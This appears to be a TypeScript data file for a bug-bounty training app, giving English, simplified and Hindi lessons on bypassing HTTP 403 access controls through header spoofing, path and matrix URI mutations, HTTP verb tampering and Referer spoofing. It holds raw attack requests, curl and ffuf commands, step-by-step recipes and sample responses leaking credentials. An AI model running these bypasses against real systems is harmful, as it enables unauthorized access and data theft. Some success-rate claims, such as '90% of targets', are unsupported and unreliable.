import type { Lang } from "./types";

export interface ForbiddenScenario {
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  commandOrRequest?: string;
  responseSample?: string;
  impact: Record<Lang, string>;
}

export interface ForbiddenTechnique {
  id: string;
  title: Record<Lang, string>;
  category: "headers" | "path_matrix" | "http_verbs" | "proxy_desync" | "encoding_tricks";
  difficulty: "beginner" | "intermediate" | "advanced";
  successRate: string;
  summary: Record<Lang, string>;
  scenarios: ForbiddenScenario[];
  stepByStepRecipe: Record<Lang, string>[];
  burpOrToolRule: string[];
  hunterProTip: Record<Lang, string>;
}

export interface ForbiddenPhase {
  phase: number;
  title: Record<Lang, string>;
  objective: Record<Lang, string>;
  steps: Record<Lang, string>[];
  commandsOrPayloads?: string[];
  keyTargets: string[];
}

export interface ForbiddenToolSnippet {
  id: string;
  title: Record<Lang, string>;
  description: Record<Lang, string>;
  category: "bash_scanner" | "burp_rules" | "curl_oneliner" | "python_fuzzer";
  code: string;
  language: "bash" | "python" | "json";
  howToUse: Record<Lang, string>;
}

export interface ForbiddenReportTemplate {
  id: string;
  title: Record<Lang, string>;
  vulnType: string;
  cvss: string;
  severity: "high" | "critical";
  reportMarkdown: string;
}

// ─── 1. TOP 403 FORBIDDEN BYPASS TECHNIQUES ──────────────────────────────────
export const FORBIDDEN_TECHNIQUES: ForbiddenTechnique[] = [
  {
    id: "header-based-spoofing",
    title: {
      en: "Header Injection & Internal IP Spoofing (X-Original-URL / X-Forwarded-For)",
      simple: "Trick Reverse Proxies into Granting Access via Headers",
      hi: "हेडर इंजेक्शन व इंटरनल IP स्पूफिंग (X-Original-URL / X-Forwarded-For बाईपास)",
    },
    category: "headers",
    difficulty: "beginner",
    successRate: "High on Nginx, Apache & AWS ALB setups",
    summary: {
      en: "Front-end reverse proxies or API gateways inspect the request URL and return 403 Forbidden if it starts with restricted paths like `/admin` or `/internal`. However, backends often support URL override headers (`X-Original-URL`, `X-Rewrite-URL`) or trust client IP headers (`X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`) intended for local debugging.",
      simple: "Security proxies block /admin based on the URL bar. If we ask the server for the home page (/) but add a secret header saying 'actually fetch /admin', the server gives us the admin panel!",
      hi: "फ़्रंट-एंड प्रॉक्सी URL देखकर `/admin` को 403 ब्लॉक कर देता है। लेकिन अगर हम URL में `/` रखें और हेडर में `X-Original-URL: /admin` या `X-Forwarded-For: 127.0.0.1` भेजें, तो बैकएंड हमें लोकल एडमिन समझकर पूरा एक्सेस दे देता है।",
    },
    scenarios: [
      {
        title: {
          en: "X-Original-URL & X-Rewrite-URL Gateway Bypass",
          simple: "Requesting '/' with 'X-Original-URL: /admin' to Access Locked Admin",
          hi: "URL में '/' रखकर X-Original-URL से बंद एडमिन पैनल खोलना",
        },
        description: {
          en: "Direct `GET /admin/users` returns HTTP 403 Forbidden from the edge gateway. By sending `GET /` with the header `X-Original-URL: /admin/users`, the edge gateway allows the request through (seeing only `/`), while the backend framework (Symfony, Laravel, Spring) rewrites the route to `/admin/users`.",
          simple: "Send a request to the main home page, but add the X-Original-URL header. The gateway lets it pass, and the backend opens the admin page.",
          hi: "गेटवे केवल URL देखता है और सोचता है कि आप होमपेज देख रहे हैं, जबकि बैकएंड हेडर पढ़कर एडमिन डेटा भेज देता है।",
        },
        commandOrRequest: `GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users/export
Accept: application/json`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "users": [
    {"id": 1, "email": "admin@target.com", "role": "superadmin"},
    {"id": 2, "email": "ceo@target.com", "role": "owner"}
  ]
}`,
        impact: {
          en: "Complete bypass of edge access control rules, revealing confidential administrative tools and internal databases.",
          simple: "Unlocks protected company admin tools without any password.",
          hi: "बिना किसी पासवर्ड के गुप्त एडमिन टूल्स और यूज़र डेटाबेस का सीधा एक्सेस।",
        },
      },
      {
        title: {
          en: "Client IP Spoofing via Localhost Headers (127.0.0.1 / ::1)",
          simple: "Tricking the Server into Thinking You Are on the Local Machine",
          hi: "सर्वर को यह विश्वास दिलाना कि रिक्वेस्ट लोकल मशीन (127.0.0.1) से आ रही है",
        },
        description: {
          en: "Many internal APIs or metrics pages (`/actuator`, `/swagger-ui.html`, `/metrics`, `/env`) are restricted to local intranet IPs. If the backend trusts untrusted forward headers, injecting `X-Forwarded-For: 127.0.0.1` or `X-Custom-IP-Authorization: 127.0.0.1` tricks the ACL into believing the request originates from the local server itself.",
          simple: "Add headers that make you look like a local system administrator working directly on the server machine.",
          hi: "हेडर में 127.0.0.1 जोड़कर सर्वर को धोखा देना ताकि वो समझे कि रिक्वेस्ट सर्वर के अंदर से ही भेजी गई है।",
        },
        commandOrRequest: `GET /api/v1/internal/config HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "database_url": "postgres://admin:secretPass@internal-db:5432/prod",
  "aws_bucket": "confidential-customer-documents-2026"
}`,
        impact: {
          en: "Exposure of high-value internal credentials, database connection strings, and infrastructure topologies.",
          simple: "Exposes secret passwords and database keys meant only for server admins.",
          hi: "डेटाबेस पासवर्ड्स और प्राइवेट क्लाउड कीज़ की सीधी चोरी।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. Locate an endpoint returning 403 Forbidden (e.g. `/admin`, `/internal`, `/api/v2/debug`).",
        simple: "1. Find any link that gives you a 403 Forbidden error.",
        hi: "1. कोई भी ऐसा पेज खोजें जहाँ 403 Forbidden एरर आ रहा हो।",
      },
      {
        en: "2. Send the request to Burp Repeater. Change the path to `/` and add header `X-Original-URL: /admin` or `X-Rewrite-URL: /admin`.",
        simple: "2. Change the URL path to / and add X-Original-URL: /admin in Burp Suite.",
        hi: "2. Burp Repeater में URL पाथ को `/` करें और हेडर में `X-Original-URL: /admin` जोड़ें।",
      },
      {
        en: "3. If still 403, keep original path `/admin` and inject IP spoofing headers one by one: `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`, `X-Originating-IP: 127.0.0.1`.",
        simple: "3. Try adding IP headers like X-Forwarded-For: 127.0.0.1 to pretend you are on the local network.",
        hi: "3. हेडर में `X-Forwarded-For: 127.0.0.1` और `X-Real-IP: 127.0.0.1` डालकर टेस्ट करें।",
      },
      {
        en: "4. Check for IPv6 variations: `X-Forwarded-For: ::1` or `X-Forwarded-For: 0:0:0:0:0:0:0:1`.",
        simple: "4. Try IPv6 localhost addresses like ::1.",
        hi: "4. IPv6 लोकलहोस्ट एड्रेस (`::1`) भी ट्राई करें।",
      },
    ],
    burpOrToolRule: [
      "Use Burp Suite Proxy -> Match and Replace rules to auto-append `X-Forwarded-For: 127.0.0.1` to all outgoing requests.",
      "Install the 'Bypass 403' or '403 Bypasser' BApp from Burp Suite BApp Store.",
    ],
    hunterProTip: {
      en: "Enterprise Cloudflare and Akamai setups often strip `X-Forwarded-For`, but developers frequently forget custom debug headers like `X-Custom-IP-Authorization: 127.0.0.1`, `X-ProxyUser-Ip: 127.0.0.1`, or `X-Remote-Addr: 127.0.0.1` which pass straight through the proxy uninspected!",
      simple: "Try rare custom headers like X-Custom-IP-Authorization. Security proxies often forget to filter these rare debug headers!",
      hi: "Cloudflare `X-Forwarded-For` को हटा सकता है, लेकिन वो `X-Custom-IP-Authorization: 127.0.0.1` या `X-ProxyUser-Ip: 127.0.0.1` जैसे कस्टम हेडर्स को नहीं हटाता! यह ट्रिक कई बड़े बग्स दिलाती है!",
    },
  },
  {
    id: "path-matrix-mutations",
    title: {
      en: "Path & Matrix URI Parameter Mutations (/..;/, /%2e/, /admin.json)",
      simple: "Mutate URL Slashes, Semicolons and Extensions to Break 403 ACLs",
      hi: "पाथ व मैट्रिक्स URI म्यूटेशन (/..;/, /%2e/, /admin.json से 403 तोड़ना)",
    },
    category: "path_matrix",
    difficulty: "intermediate",
    successRate: "Extremely High on Java Spring Boot, Tomcat & Nginx",
    summary: {
      en: "Access Control Lists (ACLs) are configured using string pattern matching (e.g. `location = /admin`). Web application frameworks (Tomcat, Spring Boot, Nginx, Ruby on Rails) parse URLs differently. Inserting path traversal sequences (`/..;/`), URL encodings (`/%2e/`), dots (`/admin.`), or alternative file extensions (`/admin.json`) tricks the access rule while reaching the target controller.",
      simple: "Firewalls block exact matches like '/admin'. By adding tiny variations like '/admin/..;/' or '/admin.json', the firewall thinks it's a different file, but the web server still opens the admin panel.",
      hi: "फ़ायरवॉल केवल पक्के नाम जैसे `/admin` को चेक करता है। URL में थोड़ा सा बदलाव जैसे `/admin/..;/`, `/admin;` या `/admin.json` करने पर फ़ायरवॉल समझ नहीं पाता, पर सर्वर वही पेज खोल देता है।",
    },
    scenarios: [
      {
        title: {
          en: "Tomcat Semicolon Matrix Path Confusion (`/admin/..;/admin`)",
          simple: "Using Semicolons to Bypass Nginx Reverse Proxy ACLs",
          hi: "Nginx के 403 ब्लॉक को टॉमकैट सेमीकोलन ट्रिक से बाईपास करना",
        },
        description: {
          en: "Nginx blocks `/admin` with 403. However, when requesting `/admin/..;/admin`, Nginx normalizes `/..;/` and assumes the path is harmless. It forwards the request to Apache Tomcat. Tomcat strips the semicolon parameter and routes directly to `/admin` with full 200 OK access.",
          simple: "Add /..;/ in the middle of the URL. Nginx ignores it, but Tomcat opens the restricted page.",
          hi: "URL के बीच में `/..;/` लगाने से Nginx ब्लॉक करना भूल जाता है और टॉमकैट सीधे एडमिन पेज खोल देता है।",
        },
        commandOrRequest: `GET /admin/..;/admin/settings HTTP/1.1
Host: target.com
Accept: text/html,application/json`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: text/html

<h1>Admin Control Panel</h1>
<p>Welcome SuperAdministrator</p>`,
        impact: {
          en: "Unrestricted administrative interface access, privilege escalation, and configuration tampering.",
          simple: "Direct access to secret administrative dashboard.",
          hi: "एडमिन कंट्रोल पैनल का सीधा एक्सेस और सेटिंग्स में बदलाव।",
        },
      },
      {
        title: {
          en: "Extension & Content Negotiation Bypasses (`/admin.json` / `/admin%20`)",
          simple: "Adding .json or Spaces to Bypass Exact Path Matching",
          hi: "पाथ के अंत में .json या स्पेस (%20) लगाकर बाईपास करना",
        },
        description: {
          en: "The firewall rule strictly matches `path == '/admin'`. Requesting `/admin.json` or `/admin%20` bypasses the exact string match. The backend framework (like Spring MVC or Rails) strips the extension or URL-decodes the trailing whitespace, invoking the `/admin` controller.",
          simple: "Add .json or a space at the end of the URL to bypass the firewall's exact word filter.",
          hi: "फ़ायरवॉल केवल `/admin` को ढूंढता है। अंत में `.json` या `%20` लगाने से फ़ायरवॉल पास हो जाता है और बैकएंड सही कंट्रोलर रन कर देता है।",
        },
        commandOrRequest: `GET /api/v1/admin.json HTTP/1.1
Host: target.com
Accept: application/json`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"admin_status": "enabled", "secrets": ["api_key_prod_9918"]}`,
        impact: {
          en: "Data exfiltration from restricted endpoints.",
          simple: "Bypasses 403 blocks and leaks sensitive JSON data.",
          hi: "403 ब्लॉक हट जाता है और सीक्रेट डेटा लीक हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. For any 403 on `/path`, systematically test path prefix/suffix mutations: `/path/`, `//path//`, `/./path/./`, `/path/.`, `/path/..;/`.",
        simple: "1. Try adding extra slashes, dots, and semicolons to the blocked link.",
        hi: "1. ब्लॉक लिंक में एक्स्ट्रा स्लैश, डॉट्स और सेमीकोलन लगाकर टेस्ट करें।",
      },
      {
        en: "2. Test URL-encoded path traversal: `/%2e/path`, `/%2e%2e/path`, `/path%20`, `/path%09`, `/path%00`.",
        simple: "2. Try URL-encoded dots and spaces like /%2e/path or /path%20.",
        hi: "2. URL-एनकोडेड डॉट्स और स्पेस (`/%2e/path`, `/path%20`) ट्राई करें।",
      },
      {
        en: "3. Test extension appended variations: `/path.json`, `/path.xml`, `/path.html`, `/path.php`, `/path;index.html`.",
        simple: "3. Add different file extensions like .json or .xml at the end.",
        hi: "3. अंत में `.json` या `.xml` लगाकर एक्सटेंशन बाईपास टेस्ट करें।",
      },
      {
        en: "4. Test uppercase / mixed case letters if the server runs on Windows/IIS or case-insensitive routing: `/Admin`, `/aDmIn`, `/ADMIN`.",
        simple: "4. Try capital letters like /Admin or /ADMIN.",
        hi: "4. बड़े अक्षरों (`/Admin`, `/ADMIN`) में पाथ लिखकर केस-सेंसिटिविटी टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Use Burp Intruder with a custom Wordlist of 403 path mutations (e.g. `/..;/`, `/%2e/`, `;.css`).",
      "Observe changes in response status code (from 403 to 200 or 302).",
    ],
    hunterProTip: {
      en: "Spring Boot Actuators (`/actuator/env`, `/actuator/heapdump`) are almost always blocked by a reverse proxy returning 403. Using `/actuator;foo=bar/env` or `/actuator/..;/actuator/env` bypasses the reverse proxy 90% of the time, leading to instant P1 critical infrastructure takeovers!",
      simple: "Spring Boot /actuator endpoints are often blocked with 403. Using /actuator;foo=bar/env bypasses it on 90% of targets!",
      hi: "Spring Boot Actuators (`/actuator/env`) पर जब भी 403 मिले, तुरंत `/actuator;foo=bar/env` या `/actuator/..;/actuator/env` टेस्ट करें। 90% केस में यह सीधा P1 क्रेडेंशियल डंप बग देता है!",
    },
  },
  {
    id: "http-verb-method-tampering",
    title: {
      en: "HTTP Method Tampering & Verb Switching (HEAD / POST / TRACE)",
      simple: "Switch GET to POST, HEAD, or Override Headers to Bypass 403",
      hi: "HTTP मेथड व वर्ब टैम्परिंग (GET के बदले POST / HEAD / TRACE से 403 बाईपास)",
    },
    category: "http_verbs",
    difficulty: "beginner",
    successRate: "Medium to High on REST APIs & WebDAV",
    summary: {
      en: "Web application firewalls and reverse proxies often define access control rules that only restrict specific HTTP verbs (such as blocking only `GET /admin` or `DELETE /users`). By switching the HTTP method to `POST`, `HEAD`, `OPTIONS`, `PUT`, `TRACE`, or injecting method override headers (`X-HTTP-Method-Override: GET`), the restriction is bypassed.",
      simple: "Firewalls often only remember to block the 'GET' command. If you ask with 'POST', 'HEAD', or 'PUT', the firewall lets you in and the server still responds with the same data.",
      hi: "फ़ायरवॉल अक्सर केवल `GET` रिक्वेस्ट को ब्लॉक करता है। अगर आप मेथड को बदलकर `POST`, `HEAD` या `X-HTTP-Method-Override` कर दें, तो फ़ायरवॉल चेकिंग छोड़ देता है और बैकएंड डेटा लौटा देता है।",
    },
    scenarios: [
      {
        title: {
          en: "HEAD Method Data Exfiltration (Leaking Response Headers)",
          simple: "Using HEAD Method to Read Secret Admin Headers",
          hi: "HEAD मेथड से गुप्त एडमिन टोकन्स व हेडर्स निकालना",
        },
        description: {
          en: "The firewall blocks `GET /api/v1/admin/token` with HTTP 403 Forbidden. Changing the method to `HEAD /api/v1/admin/token` bypasses the WAF rule. The server executes the controller and returns HTTP 200 OK along with sensitive session tokens in `Set-Cookie` or `X-Auth-Token` response headers.",
          simple: "When GET is blocked, switch to HEAD. The server returns 200 OK and sends secret auth cookies in the response headers.",
          hi: "जब GET ब्लॉक हो, तो मेथड को HEAD में बदलें। सर्वर 200 OK के साथ रिस्पॉन्स हेडर्स में सीक्रेट टोकन दे देता है।",
        },
        commandOrRequest: `HEAD /api/v1/admin/token HTTP/1.1
Host: target.com
Accept: */*`,
        responseSample: `HTTP/1.1 200 OK
Set-Cookie: admin_session=secret_admin_token_99182; Path=/; Secure; HttpOnly
X-Admin-Role: superadministrator`,
        impact: {
          en: "Authorization bypass and admin session token harvesting.",
          simple: "Steals admin login session cookies without triggering 403 blocks.",
          hi: "बिना 403 ट्रिगर किए एडमिन सेशन कुकीज़ चुराना।",
        },
      },
      {
        title: {
          en: "X-HTTP-Method-Override & Method Tunneling",
          simple: "Tunneling Blocked Methods via POST + Method Override Headers",
          hi: "POST के अंदर X-HTTP-Method-Override हेडर लगाकर ब्लॉक मेथड चलाना",
        },
        description: {
          en: "The API firewall blocks `PUT /users/101` and `DELETE /users/101` with 403 Forbidden. However, sending a benign `POST /users/101` with the header `X-HTTP-Method-Override: DELETE` bypasses the firewall inspection, while the backend framework executes the deletion.",
          simple: "Send a normal POST request, but add a header saying 'actually treat this as a DELETE'.",
          hi: "नॉर्मल POST रिक्वेस्ट भेजें और हेडर में `X-HTTP-Method-Override: DELETE` लगा दें। WAF इसे नॉर्मल POST समझकर पास कर देता है।",
        },
        commandOrRequest: `POST /api/v1/users/admin_user HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{}`,
        responseSample: `HTTP/1.1 200 OK
Content-Type: application/json

{"deleted": true, "user": "admin_user"}`,
        impact: {
          en: "Unauthorized destructive modifications and privilege bypass.",
          simple: "Execute forbidden actions like deleting accounts.",
          hi: "ब्लॉक किए गए विनाशकारी एक्शन्स (जैसे यूज़र डिलीट करना) को बाईपास करके रन करना।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. In Burp Repeater, right-click the 403 Forbidden request and select 'Change request method' (cycles between GET and POST).",
        simple: "1. In Burp Suite, right-click and change request method from GET to POST.",
        hi: "1. Burp Repeater में राइट-क्लिक करके मेथड को GET से POST में बदलें।",
      },
      {
        en: "2. If still 403, test uncommon verbs: `HEAD`, `OPTIONS`, `PUT`, `TRACE`, `PATCH`, `CONNECT`, `PROPFIND`.",
        simple: "2. Try other HTTP methods like HEAD, OPTIONS, or PUT.",
        hi: "2. अन्य मेथड्स जैसे HEAD, OPTIONS, PUT, PATCH ट्राई करें।",
      },
      {
        en: "3. Test method override headers: `X-HTTP-Method: PUT`, `X-HTTP-Method-Override: PUT`, `X-Method-Override: PUT`.",
        simple: "3. Add method override headers in your POST request.",
        hi: "3. POST रिक्वेस्ट में `X-HTTP-Method-Override: PUT` हेडर लगाकर टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Use Burp Suite's 'Change Request Method' context menu option.",
      "Check if OPTIONS response headers reveal allowed methods: `Allow: GET, POST, HEAD, OPTIONS`.",
    ],
    hunterProTip: {
      en: "Don't overlook `TRACE` or `TRACK`! Even if `GET /admin` returns 403, sending `TRACE /admin` or `OPTIONS /admin` often returns HTTP 200 OK and reflects internal backend proxy headers (like `X-Forwarded-For` or internal authentication tokens) right back to you in the response body!",
      simple: "Try TRACE or OPTIONS on 403 links. Often they respond with 200 OK and reflect secret internal headers in the body!",
      hi: "403 मिलने पर TRACE या OPTIONS भेजना न भूलें! कई बार सर्वर 200 OK दे देता है और अपने अंदरूनी सीक्रेट हेडर्स रिस्पॉन्स में लौटा देता है!",
    },
  },
  {
    id: "content-type-referer-spoofing",
    title: {
      en: "Referer, Origin & Protocol Header Spoofing",
      simple: "Pretend You Clicked from an Internal Admin Page to Bypass 403",
      hi: "Referer व Origin हेडर स्पूफिंग (एडमिन पेज से आने का नाटक करके 403 बाईपास)",
    },
    category: "proxy_desync",
    difficulty: "beginner",
    successRate: "Medium to High on legacy intranets",
    summary: {
      en: "Some web applications enforce access control by checking the HTTP `Referer` or `Origin` header (verifying that the user arrived from `https://target.com/admin/login`). By tampering with the Referer header to match an approved administrative URL, the 403 check is bypassed.",
      simple: "Websites sometimes check where you clicked from. If we fake our Referer header to say 'I just clicked this inside the secret admin area', the server lets us through.",
      hi: "कई वेबसाइट्स यह चेक करती हैं कि आप किस पेज से क्लिक करके आए हैं (Referer header)। हेडर में खुद को एडमिन पेज (`https://target.com/admin/login`) से आया हुआ दिखाकर 403 को तोड़ा जा सकता है।",
    },
    scenarios: [
      {
        title: {
          en: "Admin Referer Header Validation Bypass",
          simple: "Faking the Referer Header to Access Restricted APIs",
          hi: "Referer हेडर में एडमिन URL डालकर 403 बाईपास करना",
        },
        description: {
          en: "Accessing `GET /api/v1/export/database` returns 403 Forbidden. Adding the header `Referer: https://target.com/admin/dashboard` satisfies the weak server-side check and allows data download.",
          simple: "Put the admin dashboard URL in the Referer header to trick the access control.",
          hi: "Referer हेडर में एडमिन डैशबोर्ड का पता डालकर डेटाबेस बैकअप डाउनलोड करना।",
        },
        commandOrRequest: `GET /api/v1/export/database HTTP/1.1
Host: target.com
Referer: https://target.com/admin/dashboard
Origin: https://target.com`,
        responseSample: `HTTP/1.1 200 OK
Content-Disposition: attachment; filename="backup_2026.sql"
Content-Type: application/sql`,
        impact: {
          en: "Data exfiltration via weak referer-based authorization.",
          simple: "Downloads private database backups without login.",
          hi: "बिना लॉगिन के प्राइवेट डेटाबेस डाउनलोड हो जाता है।",
        },
      },
    ],
    stepByStepRecipe: [
      {
        en: "1. Intercept the 403 Forbidden request in Burp Suite.",
        simple: "1. Capture the 403 request in Burp Suite.",
        hi: "1. Burp Suite में 403 रिक्वेस्ट को इंटरसेप्ट करें।",
      },
      {
        en: "2. Add `Referer: https://target.com/admin/dashboard` or `Referer: https://target.com/admin/`.",
        simple: "2. Add an admin Referer header.",
        hi: "2. हेडर में `Referer: https://target.com/admin/dashboard` जोड़ें।",
      },
      {
        en: "3. Add `Origin: https://target.com` and `X-Forwarded-Proto: https`.",
        simple: "3. Add Origin and X-Forwarded-Proto headers.",
        hi: "3. `Origin` और `X-Forwarded-Proto: https` भी जोड़कर टेस्ट करें।",
      },
    ],
    burpOrToolRule: [
      "Configure Burp Match & Replace to inject trusted Referer headers automatically.",
    ],
    hunterProTip: {
      en: "Test `X-Forwarded-Proto: https` and `X-Forwarded-Port: 443`! Some reverse proxies enforce 403 if they mistakenly believe the connection arrived over insecure plain HTTP. Explicitly telling the backend the connection was HTTPS bypasses the 403 redirect/block!",
      simple: "Try adding X-Forwarded-Proto: https! Sometimes 403 happens because the server mistakenly thinks your connection is insecure HTTP.",
      hi: "`X-Forwarded-Proto: https` जरूर ट्राई करें! कई बार सर्वर सोचता है कि रिक्वेस्ट असुरक्षित HTTP से आई है और 403 दे देता है। यह हेडर लगाते ही 200 OK मिल जाता है!",
    },
  },
];

// ─── 2. 5-PHASE SYSTEMATIC 403 HUNTING METHODOLOGY ───────────────────────────
export const FORBIDDEN_METHODOLOGY_PHASES: ForbiddenPhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: 403 Endpoint Discovery & Response Fingerprinting (Hours 0 – 6)",
      simple: "Find High-Value 403 Forbidden Pages and Analyze Why They Block",
      hi: "फेज़ 1: 403 एंडपॉइंट डिस्कवरी व रिस्पॉन्स फिंगरप्रिंटिंग (घंटे 0 – 6)",
    },
    objective: {
      en: "Identify every hidden administrative, internal, and sensitive route returning 403 Forbidden, and determine whether the block comes from the CDN/WAF or the backend server.",
      simple: "Collect all 403 pages and check who is blocking: the front firewall or the real web server.",
      hi: "सभी 403 Forbidden पेजेस की लिस्ट बनाएं और चेक करें कि ब्लॉक फ़ायरवॉल लगा रहा है या बैकएंड सर्वर।",
    },
    steps: [
      {
        en: "Run directory fuzzing with ffuf / feroxbuster specifically filtering for 403 status codes (`ffuf -fc 404 -mc 403`).",
        simple: "Fuzz the website for pages returning 403 status code.",
        hi: "ffuf टूल से स्कैन करें और 403 वाले सभी पेजेस को अलग लिस्ट में सेव करें।",
      },
      {
        en: "Check response headers and body length: A 403 from Cloudflare has `Server: cloudflare`, while a 403 from Nginx or Spring Boot has custom headers (`Server: nginx`, `X-Powered-By: Spring`).",
        simple: "Check the response headers to see which software generated the 403 error.",
        hi: "रिस्पॉन्स हेडर देखकर पता लगाएं कि 403 Nginx से आया है, टॉमकैट से या Cloudflare से।",
      },
      {
        en: "Enumerate common high-value targets: `/admin`, `/internal`, `/api/v1/private`, `/actuator`, `/swagger`, `/graphql`, `/metrics`.",
        simple: "Target sensitive folders like /admin, /internal, and /actuator.",
        hi: "हाई-वैल्यू रूट्स जैसे `/admin`, `/actuator`, `/swagger` को प्राथमिकता दें।",
      },
    ],
    commandsOrPayloads: [
      "ffuf -u https://target.com/FUZZ -w /path/to/wordlists/common.txt -mc 403 -silent",
      "curl -i -s https://target.com/admin | head -n 15",
    ],
    keyTargets: [
      "Admin panels (`/admin`, `/administrator`, `/manage`)",
      "API documentation (`/swagger-ui.html`, `/openapi.json`)",
      "Spring Boot Actuator endpoints (`/actuator/env`, `/actuator/beans`)",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Header-Based Access Control Spoofing (Hours 6 – 16)",
      simple: "Test All URL Rewrite and Localhost Headers",
      hi: "फेज़ 2: हेडर-आधारित एक्सेस कंट्रोल स्पूफिंग (घंटे 6 – 16)",
    },
    objective: {
      en: "Inject client IP and route rewrite headers to bypass edge proxy ACLs and access the backend directly.",
      simple: "Send headers that claim you are on localhost or rewrite the route.",
      hi: "IP स्पूफिंग और URL रीराइट हेडर्स भेजकर प्रॉक्सी के नियमों को तोड़ें।",
    },
    steps: [
      {
        en: "Send request to root `/` with `X-Original-URL: /admin` and `X-Rewrite-URL: /admin`.",
        simple: "Test X-Original-URL and X-Rewrite-URL.",
        hi: "URL में `/` और हेडर में `X-Original-URL: /admin` लगाकर टेस्ट करें।",
      },
      {
        en: "Inject local IP headers: `X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`, `X-Real-IP: 127.0.0.1`.",
        simple: "Inject 127.0.0.1 IP spoofing headers.",
        hi: "हेडर में 127.0.0.1 लोकलहोस्ट IPs भेजें।",
      },
      {
        en: "Test intranet CIDR IPs if 127.0.0.1 fails: `10.0.0.1`, `172.16.0.1`, `192.168.1.1`.",
        simple: "Try private network IPs like 10.0.0.1.",
        hi: "प्राइवेट नेटवर्क IPs जैसे `10.0.0.1` भी टेस्ट करें।",
      },
    ],
    commandsOrPayloads: [
      "curl -H 'X-Original-URL: /admin' https://target.com/",
      "curl -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Custom-IP-Authorization: 127.0.0.1' https://target.com/admin",
    ],
    keyTargets: [
      "X-Original-URL & X-Rewrite-URL",
      "X-Forwarded-For, X-Client-IP, X-Remote-IP",
      "X-Custom-IP-Authorization",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Path, Matrix URI & Extension Fuzzing (Hours 16 – 28)",
      simple: "Mutate Slashes, Dots, Semicolons and Extensions",
      hi: "फेज़ 3: पाथ, मैट्रिक्स URI व एक्सटेंशन म्यूटेशन (घंटे 16 – 28)",
    },
    objective: {
      en: "Exploit path normalization discrepancies between reverse proxies and application servers using matrix parameters and path traversal sequences.",
      simple: "Test slashes, semicolons, and dots to fool the path checker.",
      hi: "पाथ में स्लैश, सेमीकोलन और डॉट्स बदलकर 403 को 200 OK में बदलें।",
    },
    steps: [
      {
        en: "Fuzz path prefix and suffix mutations: `/admin/`, `//admin//`, `/./admin/./`, `/admin/..;/`.",
        simple: "Add slashes, dots, and semicolons around the path.",
        hi: "पाथ के आगे-पीछे स्लैश और सेमीकोलन लगाकर टेस्ट करें।",
      },
      {
        en: "Append extensions: `/admin.json`, `/admin.html`, `/admin.php`, `/admin;.css`.",
        simple: "Add file extensions like .json or .html.",
        hi: "पाथ के अंत में `.json` या `.html` लगाएं।",
      },
      {
        en: "Test URL encoding: `/%2e/admin`, `/%252e/admin`, `/admin%20`, `/admin%09`.",
        simple: "Use URL encoded characters like %2e.",
        hi: "URL एनकोडेड कैरेक्टर्स (`/%2e/admin`) का उपयोग करें।",
      },
    ],
    commandsOrPayloads: [
      "curl -i https://target.com/admin/..;/",
      "curl -i https://target.com/%2e/admin",
      "curl -i https://target.com/admin.json",
    ],
    keyTargets: [
      "Tomcat / Spring Boot semicolon matrix (`/..;/`)",
      "Extension appended bypasses (`.json`, `.xml`)",
      "URL-encoded path traversal sequences",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: HTTP Verb & Method Overriding (Hours 28 – 38)",
      simple: "Switch Request Methods (GET to POST, HEAD, OPTIONS)",
      hi: "फेज़ 4: HTTP मेथड व वर्ब ओवरराइडिंग (घंटे 28 – 38)",
    },
    objective: {
      en: "Bypass verb-specific access control rules by altering the HTTP method or using method tunneling headers.",
      simple: "Try different HTTP verbs like POST, HEAD, or PUT.",
      hi: "मेथड बदलकर (जैसे POST, HEAD, PUT) चेक करें कि क्या 403 हटता है।",
    },
    steps: [
      {
        en: "Change method from `GET` to `POST` with an empty JSON body `{}`.",
        simple: "Send a POST request instead of GET.",
        hi: "GET के बदले खाली बॉडी `{}` के साथ POST भेजें।",
      },
      {
        en: "Test `HEAD` method to inspect whether secret auth headers are returned with HTTP 200.",
        simple: "Test HEAD method to see if response headers leak tokens.",
        hi: "HEAD मेथड भेजकर चेक करें कि क्या 200 OK के साथ टोकन्स लीक होते हैं।",
      },
      {
        en: "Test `X-HTTP-Method-Override: GET` or `X-Method-Override: PUT`.",
        simple: "Use method override headers inside POST.",
        hi: "POST में `X-HTTP-Method-Override: GET` लगाकर टेस्ट करें।",
      },
    ],
    commandsOrPayloads: [
      "curl -I https://target.com/admin",
      "curl -X POST -H 'Content-Type: application/json' -d '{}' https://target.com/admin",
      "curl -X POST -H 'X-HTTP-Method-Override: GET' https://target.com/admin",
    ],
    keyTargets: [
      "HEAD method response headers",
      "POST conversion on read endpoints",
      "X-HTTP-Method-Override header",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Internal Resource Exploitation & Report Filing (Hours 38 – 48)",
      simple: "Extract Sensitive Data and Write High-Impact Report",
      hi: "फेज़ 5: आंतरिक डेटा एक्सट्रैक्शन व हाई-इम्पैक्ट रिपोर्ट सबमिशन (घंटे 38 – 48)",
    },
    objective: {
      en: "Prove impact by extracting data from the unmasked administrative interface and document the bypass vector for immediate P2/P1 triage.",
      simple: "Extract admin data, take proof screenshots, and submit the bug report.",
